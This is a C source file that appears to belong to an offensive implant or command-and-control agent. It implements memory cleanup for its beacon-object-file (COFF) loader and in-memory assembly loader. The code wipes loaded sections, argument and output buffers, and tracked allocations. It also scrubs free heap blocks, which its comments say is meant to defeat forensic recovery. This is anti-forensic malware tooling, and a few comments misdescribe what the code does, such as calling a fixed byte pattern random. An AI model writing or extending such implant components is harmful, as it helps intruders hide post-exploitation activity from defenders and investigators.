/*
 * memory_cleanup.c — Secure memory cleanup implementation.
 */
#include "agent.h"
#include "memory_cleanup.h"

/* ─── Tracked allocation list ─── */

typedef struct _TRACKED_ALLOC {
    void  *ptr;
    SIZE_T len;
    BOOL   isVirtual;  /* TRUE = VirtualFree, FALSE = HeapFree */
} TRACKED_ALLOC;

#define MAX_TRACKED 256
static TRACKED_ALLOC g_tracked[MAX_TRACKED];
static int g_trackedCount = 0;
static CRITICAL_SECTION g_trackLock;
static BOOL g_trackInitialized = FALSE;

static void _ensure_lock_init(void) {
    if (!g_trackInitialized) {
        InitializeCriticalSection(&g_trackLock);
        g_trackInitialized = TRUE;
    }
}

/* ═══════════════════════════════════════════════════════════════════
 *  Core cleanup functions
 * ═══════════════════════════════════════════════════════════════════ */

void mem_secure_zero(void *ptr, SIZE_T len) {
    if (!ptr || len == 0) return;
    SecureZeroMemory(ptr, len);
}

void mem_secure_free(void *ptr, SIZE_T len) {
    if (!ptr) return;
    if (len > 0)
        SecureZeroMemory(ptr, len);
    HeapFree(GetProcessHeap(), 0, ptr);
}

void mem_secure_vfree(void *ptr, SIZE_T len) {
    if (!ptr) return;
    if (len > 0) {
        /* Need RW to zero if memory is RX */
        DWORD oldProt;
        if (VirtualProtect(ptr, len, PAGE_READWRITE, &oldProt)) {
            SecureZeroMemory(ptr, len);
        }
    }
    VirtualFree(ptr, 0, MEM_RELEASE);
}

/* ═══════════════════════════════════════════════════════════════════
 *  COFF loader cleanup
 * ═══════════════════════════════════════════════════════════════════ */

/* External: the COFF loader's output buffer (defined in beacon_api.c) */
extern unsigned char *g_bof_output;
extern int g_bof_output_len;
extern int g_bof_output_cap;

void mem_cleanup_coff_output(void) {
    if (g_bof_output && g_bof_output_cap > 0) {
        SecureZeroMemory(g_bof_output, (SIZE_T)g_bof_output_cap);
        g_bof_output_len = 0;
    }
}

void mem_cleanup_coff(COFF_CLEANUP_CTX *ctx) {
    if (!ctx) return;

    /* Zero and free all section allocations */
    if (ctx->sectionAddrs && ctx->sectionSizes) {
        for (int i = 0; i < ctx->numSections; i++) {
            if (ctx->sectionAddrs[i] && ctx->sectionSizes[i] > 0) {
                /* Ensure writable before zeroing (section may be RX) */
                DWORD oldProt;
                VirtualProtect(ctx->sectionAddrs[i], ctx->sectionSizes[i],
                               PAGE_READWRITE, &oldProt);
                SecureZeroMemory(ctx->sectionAddrs[i], ctx->sectionSizes[i]);
                VirtualFree(ctx->sectionAddrs[i], 0, MEM_RELEASE);
                ctx->sectionAddrs[i] = NULL;
            }
        }
    }

    /* Free indirect symbol pointers (allocated for __imp_ resolution) */
    if (ctx->indirectPtrs) {
        for (int i = 0; i < ctx->numIndirects; i++) {
            if (ctx->indirectPtrs[i]) {
                SecureZeroMemory(ctx->indirectPtrs[i], 8); /* 8 bytes for x64 fn ptr */
                HeapFree(GetProcessHeap(), 0, ctx->indirectPtrs[i]);
                ctx->indirectPtrs[i] = NULL;
            }
        }
    }

    /* Zero argument buffer */
    if (ctx->argBuffer && ctx->argBufferLen > 0) {
        SecureZeroMemory(ctx->argBuffer, ctx->argBufferLen);
    }

    /* Zero output buffer */
    mem_cleanup_coff_output();
}

/* ═══════════════════════════════════════════════════════════════════
 *  Assembly loader cleanup
 * ═══════════════════════════════════════════════════════════════════ */

void mem_cleanup_assembly(void *assemblyBytes, SIZE_T assemblyLen,
                           void *outputBuf, SIZE_T outputLen) {
    if (assemblyBytes && assemblyLen > 0)
        SecureZeroMemory(assemblyBytes, assemblyLen);

    if (outputBuf && outputLen > 0)
        SecureZeroMemory(outputBuf, outputLen);
}

/* ═══════════════════════════════════════════════════════════════════
 *  Heap scrubbing
 * ═══════════════════════════════════════════════════════════════════ */

void mem_scrub_heap(void) {
    /*
     * Walk the process heap and overwrite free blocks.
     * This is a best-effort operation — heap internals vary by OS version.
     *
     * Uses HeapWalk to enumerate blocks. Free blocks are overwritten
     * with random data. This prevents forensic tools from recovering
     * previously-used heap data.
     */
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap) return;

    /* Lock the heap during scrubbing */
    if (!HeapLock(hHeap)) return;

    PROCESS_HEAP_ENTRY entry;
    memset(&entry, 0, sizeof(entry));

    while (HeapWalk(hHeap, &entry)) {
        /* PROCESS_HEAP_UNCOMMITTED_RANGE = free block */
        if (entry.wFlags == 0 && entry.cbData > 0) {
            /* This is a free block — overwrite with random bytes */
            unsigned char *p = (unsigned char *)entry.lpData;
            for (SIZE_T i = 0; i < entry.cbData; i++) {
                p[i] = (unsigned char)(i ^ 0xAA ^ (i >> 8));
            }
        }
    }

    HeapUnlock(hHeap);
}

/* ═══════════════════════════════════════════════════════════════════
 *  Tracked allocation management
 * ═══════════════════════════════════════════════════════════════════ */

void mem_track(void *ptr, SIZE_T len, BOOL isVirtual) {
    if (!ptr) return;
    _ensure_lock_init();

    EnterCriticalSection(&g_trackLock);

    if (g_trackedCount < MAX_TRACKED) {
        g_tracked[g_trackedCount].ptr = ptr;
        g_tracked[g_trackedCount].len = len;
        g_tracked[g_trackedCount].isVirtual = isVirtual;
        g_trackedCount++;
    }
    /* If full, silently drop. Better than crashing. */

    LeaveCriticalSection(&g_trackLock);
}

void mem_flush_tracked(void) {
    _ensure_lock_init();

    EnterCriticalSection(&g_trackLock);

    for (int i = 0; i < g_trackedCount; i++) {
        if (g_tracked[i].ptr) {
            if (g_tracked[i].isVirtual) {
                mem_secure_vfree(g_tracked[i].ptr, g_tracked[i].len);
            } else {
                mem_secure_free(g_tracked[i].ptr, g_tracked[i].len);
            }
            g_tracked[i].ptr = NULL;
        }
    }
    g_trackedCount = 0;

    LeaveCriticalSection(&g_trackLock);
}
